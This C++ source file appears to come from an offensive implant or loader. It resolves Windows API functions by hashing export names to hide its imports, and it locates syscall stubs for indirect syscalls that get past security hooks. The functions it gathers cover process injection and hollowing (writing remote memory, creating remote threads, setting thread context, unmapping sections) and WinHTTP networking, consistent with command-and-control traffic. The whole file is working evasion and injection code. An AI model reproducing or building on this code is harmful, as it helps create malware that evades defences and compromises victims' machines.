#include "core/procs.hpp"

namespace Procs
{
    DWORD GetHashFromString(char* str)
    {
        size_t dwStringLength = strlen(str);
        DWORD dwHash = HASH_IV;

        for (size_t i = 0; i < dwStringLength; i++)
        {
            dwHash = dwHash * RANDOM_ADDR + static_cast<int>(str[i]);
        }

        return dwHash & 0xFFFFFFFF;
    }

    PVOID GetProcAddressByHash(
        HMODULE hModule,
        DWORD   dwHash
    ) {
        PVOID pFuncAddr = nullptr;

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + pDosHeader->e_lfanew);

        DWORD_PTR dwpExportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

        PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule + dwpExportDirRVA);

        PDWORD pdwAddrOfFuncsRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfFunctions);
        PDWORD pdwAddrOfNamesRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNames);
        PWORD pdwAddrOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++)
        {
            DWORD dwFuncNameRVA = pdwAddrOfNamesRVA[i];
            DWORD_PTR dwpFuncNameRVA = (DWORD_PTR)hModule + dwFuncNameRVA;
            char* sFuncName = (char*)dwpFuncNameRVA;
            DWORD_PTR dwpFuncAddrRVA = 0;

            DWORD dwFuncNameHash = GetHashFromString(sFuncName);
            if (dwFuncNameHash == dwHash)
            {
                dwpFuncAddrRVA = pdwAddrOfFuncsRVA[pdwAddrOfNameOrdinalsRVA[i]];
                pFuncAddr = (PVOID)((DWORD_PTR)hModule + dwpFuncAddrRVA);
                return pFuncAddr;
            }
        }

        return nullptr;
    }

    PPROCS FindProcs(
        HMODULE hNTDLL,
        HMODULE hKernel32DLL,
        HMODULE hWinHTTPDLL,
        BOOL    bIndirectSyscall
    ) {
        PPROCS pProcs = new PROCS;

        // NTAPI
        PVOID pNtAllocateVirtualMemory      = GetProcAddressByHash(hNTDLL, APIHASH_NTALLOCATEVIRTUALMEMORY);
        pProcs->lpNtAllocateVirtualMemory   = reinterpret_cast<LPPROC_NTALLOCATEVIRTUALMEMORY>(pNtAllocateVirtualMemory);
        PVOID pNtClose                      = GetProcAddressByHash(hNTDLL, APIHASH_NTCLOSE);
        pProcs->lpNtClose                   = reinterpret_cast<LPPROC_NTCLOSE>(pNtClose);
        PVOID pNtCreateFile                 = GetProcAddressByHash(hNTDLL, APIHASH_NTCREATEFILE);
        pProcs->lpNtCreateFile              = reinterpret_cast<LPPROC_NTCREATEFILE>(pNtCreateFile);
        PVOID pNtCreateProcessEx            = GetProcAddressByHash(hNTDLL, APIHASH_NTCREATEPROCESSEX);
        pProcs->lpNtCreateProcessEx         = reinterpret_cast<LPPROC_NTCREATEPROCESSEX>(pNtCreateProcessEx);
        PVOID pNtCreateSection              = GetProcAddressByHash(hNTDLL, APIHASH_NTCREATESECTION);
        pProcs->lpNtCreateSection           = reinterpret_cast<LPPROC_NTCREATESECTION>(pNtCreateSection);
        PVOID pNtCreateThreadEx             = GetProcAddressByHash(hNTDLL, APIHASH_NTCREATETHREADEX);
        pProcs->lpNtCreateThreadEx          = reinterpret_cast<LPPROC_NTCREATETHREADEX>(pNtCreateThreadEx);
        PVOID pNtDuplicateObject            = GetProcAddressByHash(hNTDLL, APIHASH_NTDUPLICATEOBJECT);
        pProcs->lpNtDuplicateObject         = reinterpret_cast<LPPROC_NTDUPLICATEOBJECT>(pNtDuplicateObject);
        PVOID pNtFreeVirtualMemory          = GetProcAddressByHash(hNTDLL, APIHASH_NTFREEVIRTUALMEMORY);
        pProcs->lpNtFreeVirtualMemory       = reinterpret_cast<LPPROC_NTFREEVIRTUALMEMORY>(pNtFreeVirtualMemory);
        PVOID pNtGetContextThread           = GetProcAddressByHash(hNTDLL, APIHASH_NTGETCONTEXTTHREAD);
        pProcs->lpNtGetContextThread        = reinterpret_cast<LPPROC_NTGETCONTEXTTHREAD>(pNtGetContextThread);
        PVOID pNtMapViewOfSection           = GetProcAddressByHash(hNTDLL, APIHASH_NTMAPVIEWOFSECTION);
        pProcs->lpNtMapViewOfSection        = reinterpret_cast<LPPROC_NTMAPVIEWOFSECTION>(pNtMapViewOfSection);
        PVOID pNtOpenProcess                = GetProcAddressByHash(hNTDLL, APIHASH_NTOPENPROCESS);
        pProcs->lpNtOpenProcess             = reinterpret_cast<LPPROC_NTOPENPROCESS>(pNtOpenProcess);
        PVOID pNtOpenProcessToken           = GetProcAddressByHash(hNTDLL, APIHASH_NTOPENPROCESSTOKEN);
        pProcs->lpNtOpenProcessToken        = reinterpret_cast<LPPROC_NTOPENPROCESSTOKEN>(pNtOpenProcessToken);
        PVOID pNtOpenThread                 = GetProcAddressByHash(hNTDLL, APIHASH_NTOPENTHREAD);
        pProcs->lpNtOpenThread              = reinterpret_cast<LPPROC_NTOPENTHREAD>(pNtOpenThread);
        PVOID pNtProtectVirtualMemory       = GetProcAddressByHash(hNTDLL, APIHASH_NTPROTECTVIRTUALMEMORY);
        pProcs->lpNtProtectVirtualMemory    = reinterpret_cast<LPPROC_NTPROTECTVIRTUALMEMORY>(pNtProtectVirtualMemory);
        PVOID pNtQueryInformationFile       = GetProcAddressByHash(hNTDLL, APIHASH_NTQUERYINFORMATIONFILE);
        pProcs->lpNtQueryInformationFile    = reinterpret_cast<LPPROC_NTQUERYINFORMATIONFILE>(pNtQueryInformationFile);
        PVOID pNtQueryInformationProcess    = GetProcAddressByHash(hNTDLL, APIHASH_NTQUERYINFORMATIONPROCESS);
        pProcs->lpNtQueryInformationProcess = reinterpret_cast<LPPROC_NTQUERYINFORMATIONPROCESS>(pNtQueryInformationProcess);
        PVOID pNtQueryVirtualMemory         = GetProcAddressByHash(hNTDLL, APIHASH_NTQUERYVIRTUALMEMORY);
        pProcs->lpNtQueryVirtualMemory      = reinterpret_cast<LPPROC_NTQUERYVIRTUALMEMORY>(pNtQueryVirtualMemory);
        PVOID pNtReadFile                   = GetProcAddressByHash(hNTDLL, APIHASH_NTREADFILE);
        pProcs->lpNtReadFile                = reinterpret_cast<LPPROC_NTREADFILE>(pNtReadFile);
        PVOID pNtReadVirtualMemory          = GetProcAddressByHash(hNTDLL, APIHASH_NTREADVIRTUALMEMORY);
        pProcs->lpNtReadVirtualMemory       = reinterpret_cast<LPPROC_NTREADVIRTUALMEMORY>(pNtReadVirtualMemory);
        PVOID pNtResumeThread               = GetProcAddressByHash(hNTDLL, APIHASH_NTRESUMETHREAD);
        pProcs->lpNtResumeThread            = reinterpret_cast<LPPROC_NTRESUMETHREAD>(pNtResumeThread);
        PVOID pNtSetContextThread           = GetProcAddressByHash(hNTDLL, APIHASH_NTSETCONTEXTTHREAD);
        pProcs->lpNtSetContextThread        = reinterpret_cast<LPPROC_NTSETCONTEXTTHREAD>(pNtSetContextThread);
        PVOID pNtSetInformationProcess      = GetProcAddressByHash(hNTDLL, APIHASH_NTSETINFORMATIONPROCESS);
        pProcs->lpNtSetInformationProcess   = reinterpret_cast<LPPROC_NTSETINFORMATIONPROCESS>(pNtSetInformationProcess);
        PVOID pNtTerminateProcess           = GetProcAddressByHash(hNTDLL, APIHASH_NTTERMINATEPROCESS);
        pProcs->lpNtTerminateProcess        = reinterpret_cast<LPPROC_NTTERMINATEPROCESS>(pNtTerminateProcess);
        PVOID pNtUnmapViewOfSection         = GetProcAddressByHash(hNTDLL, APIHASH_NTUNMAPVIEWOFSECTION);
        pProcs->lpNtUnmapViewOfSection      = reinterpret_cast<LPPROC_NTUNMAPVIEWOFSECTION>(pNtUnmapViewOfSection);
        PVOID pNtWaitForSingleObject        = GetProcAddressByHash(hNTDLL, APIHASH_NTWAITFORSINGLEOBJECT);
        pProcs->lpNtWaitForSingleObject     = reinterpret_cast<LPPROC_NTWAITFORSINGLEOBJECT>(pNtWaitForSingleObject);
        PVOID pNtWriteFile                  = GetProcAddressByHash(hNTDLL, APIHASH_NTWRITEFILE);
        pProcs->lpNtWriteFile               = reinterpret_cast<LPPROC_NTWRITEFILE>(pNtWriteFile);
        PVOID pNtWriteVirtualMemory         = GetProcAddressByHash(hNTDLL, APIHASH_NTWRITEVIRTUALMEMORY);
        pProcs->lpNtWriteVirtualMemory      = reinterpret_cast<LPPROC_NTWRITEVIRTUALMEMORY>(pNtWriteVirtualMemory);
        PVOID pRtlAllocateHeap              = GetProcAddressByHash(hNTDLL, APIHASH_RTLALLOCATEHEAP);
        pProcs->lpRtlAllocateHeap           = reinterpret_cast<LPPROC_RTLALLOCATEHEAP>(pRtlAllocateHeap);
        PVOID pRtlCreateUserThread          = GetProcAddressByHash(hNTDLL, APIHASH_RTLCREATEUSERTHREAD);
        pProcs->lpRtlCreateUserThread       = reinterpret_cast<LPPROC_RTLCREATEUSERTHREAD>(pRtlCreateUserThread);
        PVOID pRtlGetFullPathName_U         = GetProcAddressByHash(hNTDLL, APIHASH_RTLGETFULLPATHNAME_U);
        pProcs->lpRtlGetFullPathName_U      = reinterpret_cast<LPPROC_RTLGETFULLPATHNAME_U>(pRtlGetFullPathName_U);
        PVOID pRtlInitUnicodeString         = GetProcAddressByHash(hNTDLL, APIHASH_RTLINITUNICODESTRING);
        pProcs->lpRtlInitUnicodeString      = reinterpret_cast<LPPROC_RTLINITUNICODESTRING>(pRtlInitUnicodeString);
        PVOID pRtlStringCchCatW             = GetProcAddressByHash(hNTDLL, APIHASH_RTLSTRINGCCHCATW);
        pProcs->lpRtlStringCchCatW          = reinterpret_cast<LPPROC_RTLSTRINGCCHCATW>(pRtlStringCchCatW);
        PVOID pRtlStringCchCopyW            = GetProcAddressByHash(hNTDLL, APIHASH_RTLSTRINGCCHCOPYW);
        pProcs->lpRtlStringCchCopyW         = reinterpret_cast<LPPROC_RTLSTRINGCCHCOPYW>(pRtlStringCchCopyW);
        PVOID pRtlStringCchLengthW          = GetProcAddressByHash(hNTDLL, APIHASH_RTLSTRINGCCHLENGTHW);
        pProcs->lpRtlStringCchLengthW       = reinterpret_cast<LPPROC_RTLSTRINGCCHLENGTHW>(pRtlStringCchLengthW);
        PVOID pRtlZeroMemory                = GetProcAddressByHash(hNTDLL, APIHASH_RTLZEROMEMORY);
        pProcs->lpRtlZeroMemory             = reinterpret_cast<LPPROC_RTLZEROMEMORY>(pRtlZeroMemory);

        // WINAPI
        PVOID pCreateThreadpoolWait         = GetProcAddressByHash(hKernel32DLL, APIHASH_CREATETHREADPOOLWAIT);
        pProcs->lpCreateThreadpoolWait      = reinterpret_cast<LPPROC_CREATETHREADPOOLWAIT>(pCreateThreadpoolWait);
        PVOID pSetThreadpoolWait            = GetProcAddressByHash(hKernel32DLL, APIHASH_SETTHREADPOOLWAIT);
        pProcs->lpSetThreadpoolWait         = reinterpret_cast<LPPROC_SETTHREADPOOLWAIT>(pSetThreadpoolWait);
        PVOID pWinHttpCloseHandle           = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPCLOSEHANDLE);
        pProcs->lpWinHttpCloseHandle        = reinterpret_cast<LPPROC_WINHTTPCLOSEHANDLE>(pWinHttpCloseHandle);
        PVOID pWinHttpConnect               = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPCONNECT);
        pProcs->lpWinHttpConnect            = reinterpret_cast<LPPROC_WINHTTPCONNECT>(pWinHttpConnect);
        PVOID pWinHttpOpen                  = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPOPEN);
        pProcs->lpWinHttpOpen               = reinterpret_cast<LPPROC_WINHTTPOPEN>(pWinHttpOpen);
        PVOID pWinHttpOpenRequest           = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPOPENREQUEST);
        pProcs->lpWinHttpOpenRequest        = reinterpret_cast<LPPROC_WINHTTPOPENREQUEST>(pWinHttpOpenRequest);
        PVOID pWinHttpQueryDataAvailable    = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPQUERYDATAAVAILABLE);
        pProcs->lpWinHttpQueryDataAvailable = reinterpret_cast<LPPROC_WINHTTPQUERYDATAAVAILABLE>(pWinHttpQueryDataAvailable);
        PVOID pWinHttpQueryHeaders          = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPQUERYHEADERS);
        pProcs->lpWinHttpQueryHeaders       = reinterpret_cast<LPPROC_WINHTTPQUERYHEADERS>(pWinHttpQueryHeaders);
        PVOID pWinHttpReadData              = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPREADDATA);
        pProcs->lpWinHttpReadData           = reinterpret_cast<LPPROC_WINHTTPREADDATA>(pWinHttpReadData);
        PVOID pWinHttpReceiveResponse       = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPRECEIVERESPONSE);
        pProcs->lpWinHttpReceiveResponse    = reinterpret_cast<LPPROC_WINHTTPRECEIVERESPONSE>(pWinHttpReceiveResponse);
        PVOID pWinHttpSendRequest           = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPSENDREQUEST);
        pProcs->lpWinHttpSendRequest        = reinterpret_cast<LPPROC_WINHTTPSENDREQUEST>(pWinHttpSendRequest);
        PVOID pWinHttpSetOption             = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPSETOPTION);
        pProcs->lpWinHttpSetOption          = reinterpret_cast<LPPROC_WINHTTPSETOPTION>(pWinHttpSetOption);
        PVOID pWinHttpWriteData             = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPWRITEDATA);
        pProcs->lpWinHttpWriteData          = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);

        if (bIndirectSyscall)
        {
            pProcs->sysNtAllocateVirtualMemory      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAllocateVirtualMemory));
            pProcs->sysNtClose                      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtClose));
            pProcs->sysNtCreateFile                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateFile));
            pProcs->sysNtCreateProcessEx            = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateProcessEx));
            pProcs->sysNtCreateSection              = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateSection));
            pProcs->sysNtCreateThreadEx             = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateThreadEx));
            pProcs->sysNtFreeVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtFreeVirtualMemory));
            pProcs->sysNtGetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtGetContextThread));
            pProcs->sysNtMapViewOfSection           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtMapViewOfSection));
            pProcs->sysNtOpenProcess                = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcess));
            pProcs->sysNtOpenProcessToken           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcessToken));
            pProcs->sysNtOpenThread                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenThread));
            pProcs->sysNtProtectVirtualMemory       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtProtectVirtualMemory));
            pProcs->sysNtQueryInformationFile       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationFile));
            pProcs->sysNtQueryInformationProcess    = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationProcess));
            pProcs->sysNtQueryVirtualMemory         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryVirtualMemory));
            pProcs->sysNtReadFile                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadFile));
            pProcs->sysNtReadVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadVirtualMemory));
            pProcs->sysNtResumeThread               = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtResumeThread));
            pProcs->sysNtSetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetContextThread));
            pProcs->sysNtSetInformationProcess      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetInformationProcess));
            pProcs->sysNtTerminateProcess           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtTerminateProcess));
            pProcs->sysNtUnmapViewOfSection         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtUnmapViewOfSection));
            pProcs->sysNtWaitForSingleObject        = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWaitForSingleObject));
            pProcs->sysNtWriteVirtualMemory         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteVirtualMemory));
            pProcs->sysNtWriteFile                  = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteFile));
            pProcs->sysRtlCreateUserThread          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlCreateUserThread));
            pProcs->sysRtlInitUnicodeString         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlInitUnicodeString));
            pProcs->sysRtlGetFullPathName_U         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlGetFullPathName_U));
        }

        return pProcs;
    }
}